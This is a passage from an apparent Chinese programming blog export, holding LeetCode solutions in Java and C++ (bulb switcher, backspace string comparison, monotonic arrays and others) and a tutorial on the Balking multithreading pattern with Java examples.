<li>两个字符串不相等，那么任意字符串的长度就是最长特殊字符序列</li>
</ol>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findLUSlength</span><span class="params">(String a, String b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> la = a.length();</span><br><span class="line">    <span class="keyword">int</span> lb = b.length();</span><br><span class="line">    <span class="keyword">if</span> (la != lb) &#123;</span><br><span class="line">        <span class="keyword">return</span> Math.max(la, lb);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (a.equals(b)) &#123;</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> la;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>672. 灯泡开关 Ⅱ</title>
    <url>/2018/09/05/LeetCode/leetcode-000672.%20%E7%81%AF%E6%B3%A1%E5%BC%80%E5%85%B3%20%E2%85%A1/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>现有一个房间，墙上挂有 n 只已经打开的灯泡和 4 个按钮。在进行了 m 次未知操作后，你需要返回这 n 只灯泡可能有多少种不同的状态。</p>
<p>假设这 n 只灯泡被编号为 [1, 2, 3 …, n]，这 4 个按钮的功能如下：</p>
<ol>
<li>将所有灯泡的状态反转（即开变为关，关变为开）</li>
<li>将编号为偶数的灯泡的状态反转</li>
<li>将编号为奇数的灯泡的状态反转</li>
<li>将编号为 3k+1 的灯泡的状态反转（k = 0, 1, 2, …)</li>
</ol>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: n &#x3D; 1, m &#x3D; 1.</span><br><span class="line">输出: 2</span><br><span class="line">说明: 状态为: [开], [关]</span><br></pre></td></tr></table></figure>
<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: n &#x3D; 2, m &#x3D; 1.</span><br><span class="line">输出: 3</span><br><span class="line">说明: 状态为: [开, 关], [关, 开], [关, 关]</span><br></pre></td></tr></table></figure>
<h2 id="示例3："><a href="#示例3：" class="headerlink" title="示例3："></a>示例3：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: n &#x3D; 3, m &#x3D; 1.</span><br><span class="line">输出: 4</span><br><span class="line">说明: 状态为: [关, 开, 关], [开, 关, 开], [关, 关, 关], [关, 开, 开].</span><br></pre></td></tr></table></figure>
<h2 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h2><p><code>n</code> 和 <code>m</code> 都属于 [0, 1000].</p>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p><a href="https://blog.csdn.net/huanghanqian/article/details/77857912" target="_blank" rel="noopener">https://blog.csdn.net/huanghanqian/article/details/77857912</a></p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">flipLights</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span> m)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(m==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(n==<span class="number">1</span>) <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span>(n==<span class="number">2</span>&amp;&amp;m==<span class="number">1</span>) <span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">if</span>(n==<span class="number">2</span>) <span class="keyword">return</span> <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">if</span>(m==<span class="number">1</span>) <span class="keyword">return</span> <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">if</span>(m==<span class="number">2</span>) <span class="keyword">return</span> <span class="number">7</span>;</span><br><span class="line">    <span class="keyword">if</span>(m&gt;=<span class="number">3</span>) <span class="keyword">return</span> <span class="number">8</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">8</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Math</tag>
      </tags>
  </entry>
  <entry>
    <title>844. 比较含退格的字符串</title>
    <url>/2018/09/05/LeetCode/leetcode-000844.%20%E6%AF%94%E8%BE%83%E5%90%AB%E9%80%80%E6%A0%BC%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定 S 和 T 两个字符串，当它们分别被输入到空白的文本编辑器后，判断二者是否相等，并返回结果。 # 代表退格字符。</p>
<h3 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：S &#x3D; &quot;ab#c&quot;, T &#x3D; &quot;ad#c&quot;</span><br><span class="line">输出：true</span><br><span class="line">解释：S 和 T 都会变成 “ac”。</span><br></pre></td></tr></table></figure>
<h3 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：S &#x3D; &quot;ab##&quot;, T &#x3D; &quot;c#d#&quot;</span><br><span class="line">输出：true</span><br><span class="line">解释：S 和 T 都会变成 “”。</span><br></pre></td></tr></table></figure>
<h3 id="示例3："><a href="#示例3：" class="headerlink" title="示例3："></a>示例3：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：S &#x3D; &quot;a##c&quot;, T &#x3D; &quot;#a#c&quot;</span><br><span class="line">输出：true</span><br><span class="line">解释：S 和 T 都会变成 “c”。</span><br></pre></td></tr></table></figure>
<h3 id="示例4："><a href="#示例4：" class="headerlink" title="示例4："></a>示例4：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：S &#x3D; &quot;a#c&quot;, T &#x3D; &quot;b&quot;</span><br><span class="line">输出：false</span><br><span class="line">解释：S 会变成 “c”，但 T 仍然是 “b”。</span><br></pre></td></tr></table></figure>
<h2 id="提示："><a href="#提示：" class="headerlink" title="提示："></a>提示：</h2><ol>
<li>1 &lt;= S.length &lt;= 200</li>
<li>1 &lt;= T.length &lt;= 200</li>
<li>S 和 T 只含有小写字母以及字符 ‘#’。<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3>使用栈，先入栈，碰到<code>#</code>就出栈</li>
</ol>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">backspaceCompare</span><span class="params">(String S, String T)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> getRealString(S).equals(getRealString(T));</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">private</span> String <span class="title">getRealString</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">		Stack&lt;Character&gt; stack = <span class="keyword">new</span> Stack&lt;&gt;();</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; s.length();i++) &#123;</span><br><span class="line">			<span class="keyword">char</span> c = s.charAt(i);</span><br><span class="line">			<span class="keyword">if</span> (c == <span class="string">'#'</span> &amp;&amp; !stack.isEmpty()) &#123;</span><br><span class="line">				stack.pop();</span><br><span class="line">			&#125; <span class="keyword">else</span> <span class="keyword">if</span> (c != <span class="string">'#'</span>) &#123;</span><br><span class="line">				stack.push(c);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		StringBuffer sb = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">		<span class="keyword">while</span>(!stack.isEmpty()) &#123;</span><br><span class="line">			sb.append(stack.pop());</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> sb.toString();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="CPP"><a href="#CPP" class="headerlink" title="CPP"></a>CPP</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h3><p>从字符串的尾部开始遍历，统计遇到的<code>#</code>符号个数记为count，当下一个字符不是#的时候，从该字符开始计算，跳过count个字符。当count为0，并且当前字符不为<code>#</code>时，才算作有效字符。</p>
<p>比如字符串123##22</p>
<p>当从字符串末尾开始遍历的时候，遇到了两个<code>#</code>，此时count为2，那么代表它要跳过两个字符，在跳过的同时，count自减。因此，当字符<code>1</code>的时候，count为0，那么<code>1</code>就是有效字符</p>
<h4 id="Java-1"><a href="#Java-1" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">backspaceCompare</span><span class="params">(String S, String T)</span> </span>&#123;</span><br><span class="line">		String s = getValidString(S);</span><br><span class="line">		String t = getValidString(T);</span><br><span class="line">		<span class="keyword">return</span> s.equals(t);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">private</span> String <span class="title">getValidString</span><span class="params">(String S)</span> </span>&#123;</span><br><span class="line">		StringBuilder s = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">		<span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = S.length() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">			<span class="keyword">if</span> (S.charAt(i) == <span class="string">'#'</span>) &#123;</span><br><span class="line">				count++;</span><br><span class="line"></span><br><span class="line">			&#125; <span class="keyword">else</span> <span class="keyword">if</span> (count &gt; <span class="number">0</span>) &#123;</span><br><span class="line">				count--;</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				s.append(S.charAt(i));</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> s.toString();</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>String</tag>
      </tags>
  </entry>
  <entry>
    <title>896. 单调数列</title>
    <url>/2018/09/05/LeetCode/leetcode-000896.%20%E5%8D%95%E8%B0%83%E6%95%B0%E5%88%97/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>如果数组是单调递增或单调递减的，那么它是单调的。</p>
<p>如果对于所有 i &lt;= j，A[i] &lt;= A[j]，那么数组 A 是单调递增的。 如果对于所有 i &lt;= j，A[i]&gt; = A[j]，那么数组 A 是单调递减的。</p>
<p>当给定的数组 A 是单调数组时返回 true，否则返回 false。</p>
<h3 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：[1,2,2,3]</span><br><span class="line">输出：true</span><br></pre></td></tr></table></figure>
<h3 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：[1,2,2,3]</span><br><span class="line">输出：true</span><br></pre></td></tr></table></figure>
<h3 id="示例3："><a href="#示例3：" class="headerlink" title="示例3："></a>示例3：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：[1,3,2]</span><br><span class="line">输出：false</span><br></pre></td></tr></table></figure>
<h3 id="示例4："><a href="#示例4：" class="headerlink" title="示例4："></a>示例4：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：[1,2,4,5]</span><br><span class="line">输出：true</span><br></pre></td></tr></table></figure>
<h3 id="示例5："><a href="#示例5：" class="headerlink" title="示例5："></a>示例5：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：[1,1,1]</span><br><span class="line">输出：true</span><br></pre></td></tr></table></figure>
<h3 id="提示："><a href="#提示：" class="headerlink" title="提示："></a>提示：</h3><ol>
<li>1 &lt;= A.length &lt;= 50000</li>
<li>-100000 &lt;= A[i] &lt;= 100000<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h3>遍历两次数组，分别判断是否递增或者递减。时间复杂度O(2 * n)</li>
</ol>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isMonotonic</span><span class="params">(<span class="keyword">int</span>[] A)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">boolean</span> isAsc = isAsc(A);</span><br><span class="line">	<span class="keyword">boolean</span> isDesc = isDesc(A);</span><br><span class="line">	<span class="keyword">return</span> isAsc || isDesc;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">isAsc</span><span class="params">(<span class="keyword">int</span>[] A)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; A.length - <span class="number">1</span>;i++) &#123;</span><br><span class="line">		<span class="keyword">if</span> (A[i + <span class="number">1</span>] &lt; A[i]) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">isDesc</span><span class="params">(<span class="keyword">int</span>[] A)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; A.length - <span class="number">1</span>;i++) &#123;</span><br><span class="line">		<span class="keyword">if</span> (A[i + <span class="number">1</span>] &gt; A[i]) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="CPP"><a href="#CPP" class="headerlink" title="CPP"></a>CPP</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">isAsc</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &amp;A)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; A.<span class="built_in">size</span>() - <span class="number">1</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (A[i + <span class="number">1</span>] &lt; A[i]) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isDesc</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &amp;A)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; A.<span class="built_in">size</span>() - <span class="number">1</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (A[i + <span class="number">1</span>] &gt; A[i]) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isMonotonic</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &amp;A)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> isAsc(A) || isDesc(A);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h3><p>遍历两次感觉有点多余了，那么是不是可以把遍历次数限制在一次呢。其实是可以的。我们可以在一次循环中判断数列是否是一个单调数列。</p>
<p>定义两个变量isAcs，isDesc，初始化为true。然后遍历数列，只要在遍历的过程中，发现A[i] &lt; A[i + 1]， 那么数列就不是递减的，isDesc就是false，反之，如果A[i] &gt; A[i + 1]，数列就不是递增的，isAsc就是false。最后的结果，取isAsc || isDesc即可，两者只要一个为true，就是单调序列。</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isMonotonic</span><span class="params">(<span class="keyword">int</span>[] A)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">boolean</span> isAsc = <span class="keyword">true</span>;</span><br><span class="line">		<span class="keyword">boolean</span> isDesc = <span class="keyword">true</span>;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; A.length - <span class="number">1</span>;i++) &#123;</span><br><span class="line">			<span class="keyword">if</span> (A[i] &lt; A[i + <span class="number">1</span>]) &#123;</span><br><span class="line">				isDesc = <span class="keyword">false</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">			<span class="keyword">if</span> (A[i] &gt; A[i + <span class="number">1</span>]) &#123;</span><br><span class="line">				isAsc = <span class="keyword">false</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">return</span> isAsc || isDesc;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h4 id="CPP-1"><a href="#CPP-1" class="headerlink" title="CPP"></a>CPP</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">isMonotonic</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &amp;A)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">bool</span> isAsc = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">bool</span> isDesc = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; A.<span class="built_in">size</span>() - <span class="number">1</span>;i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (A[i] &lt; A[i + <span class="number">1</span>]) &#123;</span><br><span class="line">                isDesc = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (A[i] &gt; A[i + <span class="number">1</span>]) &#123;</span><br><span class="line">                isAsc = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> isAsc || isDesc;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>数组</tag>
      </tags>
  </entry>
  <entry>
    <title>Balking 模式</title>
    <url>/2018/09/05/Java/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/4.Balking%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h1 id="Balking-模式"><a href="#Balking-模式" class="headerlink" title="Balking 模式"></a>Balking 模式</h1><p>所谓Balk，就是“停止并返回”的意思，如果现在不适合执行这个操作，或者没有必要执行这个操作，就停止处理，直接返回。</p>
<h2 id="示例程序"><a href="#示例程序" class="headerlink" title="示例程序"></a>示例程序</h2><p>我们来看一个使用了Balking模式的简单示例程序。这个程序会定期将当前数据内容写入文件中。<br>当数据内容被写入时，会完全覆盖上次写入的内容，只有最新的内容才会被保存。<br>另外，当写入的内容与上次写入的内容完全相同时，再向文件写入就显得多余了，所以就不再执行写入操作。也就是说，该程序以“数据内容存在不同”作为守护条件，如果数据内容相同，则不再执行写入操作，直接返回。</p>
<h3 id="类的一览表"><a href="#类的一览表" class="headerlink" title="类的一览表"></a>类的一览表</h3><table>
<thead>
<tr>
<th>名字</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>Data</td>
<td>表示可以修改并保存的数据的类</td>
</tr>
<tr>
<td>SaveThread</td>
<td>定期保存数据内容的类</td>
</tr>
<tr>
<td>ChangeThread</td>
<td>修改并保存数据内容的类</td>
</tr>
<tr>
<td>Main</td>
<td>测试程序行为的类</td>
</tr>
</tbody></table>
<h3 id="data类"><a href="#data类" class="headerlink" title="data类"></a>data类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Data</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> String fileName;    <span class="comment">// 执行保存的文件名称</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> String content;    <span class="comment">// 表示数据内容的字符串</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">boolean</span> changed;    <span class="comment">// 数据内容是否被修改过</span></span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">Data</span><span class="params">(String fileName, String content)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.fileName = fileName;</span><br><span class="line">		<span class="keyword">this</span>.content = content;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">change</span><span class="params">(String newContent)</span> </span>&#123;</span><br><span class="line">		content = newContent;</span><br><span class="line">		changed = <span class="keyword">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">save</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (!changed) &#123;</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		doSave();</span><br><span class="line">		changed = <span class="keyword">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">doSave</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">		System.out.println(Thread.currentThread().getName() + <span class="string">" calls doSave. content = "</span> + content);</span><br><span class="line">		Writer writer = <span class="keyword">new</span> FileWriter(fileName);</span><br><span class="line">		writer.write(content);</span><br><span class="line">		writer.close();</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="SaveThread类"><a href="#SaveThread类" class="headerlink" title="SaveThread类"></a>SaveThread类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SaveThread</span> <span class="keyword">extends</span> <span class="title">Thread</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> Data data;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">SaveThread</span><span class="params">(String name, Data data)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">super</span>(name);</span><br><span class="line">		<span class="keyword">this</span>.data = data;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			<span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">				data.save();</span><br><span class="line">				Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ChangeThread类"><a href="#ChangeThread类" class="headerlink" title="ChangeThread类"></a>ChangeThread类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ChangeThread</span> <span class="keyword">extends</span> <span class="title">Thread</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> Data data;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> Random random = <span class="keyword">new</span> Random();</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">ChangeThread</span><span class="params">(String name, Data data)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">super</span>(name);</span><br><span class="line">		<span class="keyword">this</span>.data = data;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;<span class="keyword">true</span>;i++) &#123;</span><br><span class="line">				data.change(<span class="string">"No."</span> + i);</span><br><span class="line">				Thread.sleep(random.nextInt(<span class="number">1000</span>));</span><br><span class="line">				data.save();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Main类"><a href="#Main类" class="headerlink" title="Main类"></a>Main类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		Data data = <span class="keyword">new</span> Data(<span class="string">"data.txt"</span>, <span class="string">"(empty)"</span>);</span><br><span class="line">		<span class="keyword">new</span> ChangeThread(<span class="string">"ChangeThread"</span>, data).start();</span><br><span class="line">		<span class="keyword">new</span> SaveThread(<span class="string">"SaveThread"</span>, data).start();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>java多线程设计模式</category>
      </categories>
      <tags>
        <tag>多线程</tag>
        <tag>java</tag>
        <tag>设计模式</tag>
        <tag>Balking 模式</tag>
      </tags>
  </entry>
  <entry>
    <title>58. 最后一个单词的长度</title>
    <url>/2018/09/04/LeetCode/leetcode-000058.%20%E6%9C%80%E5%90%8E%E4%B8%80%E4%B8%AA%E5%8D%95%E8%AF%8D%E7%9A%84%E9%95%BF%E5%BA%A6/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个仅包含大小写字母和空格 <code>&#39; &#39;</code> 的字符串，返回其最后一个单词的长度。</p>
<p>如果不存在最后一个单词，请返回 0 。</p>
<h2 id="说明："><a href="#说明：" class="headerlink" title="说明："></a>说明：</h2><p>一个单词是指由字母组成，但不包含任何空格的字符串。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: <span class="string">"Hello World"</span></span><br><span class="line">输出: <span class="number">5</span></span><br></pre></td></tr></table></figure>
